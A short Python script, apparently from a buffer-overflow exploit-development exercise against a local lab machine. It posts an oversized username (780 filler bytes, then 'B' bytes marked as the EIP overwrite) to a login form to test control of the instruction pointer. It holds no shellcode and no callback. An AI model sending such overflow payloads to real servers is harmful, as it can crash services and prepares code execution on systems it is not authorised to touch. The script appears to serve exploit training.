import requests, json
from time import sleep
import sys

headers = {
"Host": "192.168.1.4",
"User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0",
"Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
"Accept-Language": "en-US,en;q=0.5",
"Accept-Encoding": "gzip, deflate",
"Content-Type": "application/x-www-form-urlencoded",
"Content-Length": "27",
"Origin": "http://192.168.1.4",
"Connection": "close",
"Referer": "http://192.168.1.4/login",
"Upgrade-Insecure-Requests": "1"
}

filler = 780*"A"
eip = 4*"B"
offset = 4*"C"
buffer = "D" * (1500 - len(filler) - len(eip) - len(offset))

buffer = filler + eip + offset + buffer
try:
	url = "http://192.168.1.4/login"
	data = {
	     "username":buffer,
	     "password":"AAAA"
	    }
	ans = requests.post(url, data=data, headers=headers)
	print("Sending {} bytes".format(buffer))
except:
	print("Could not coonect to the server")
	sys.exit()
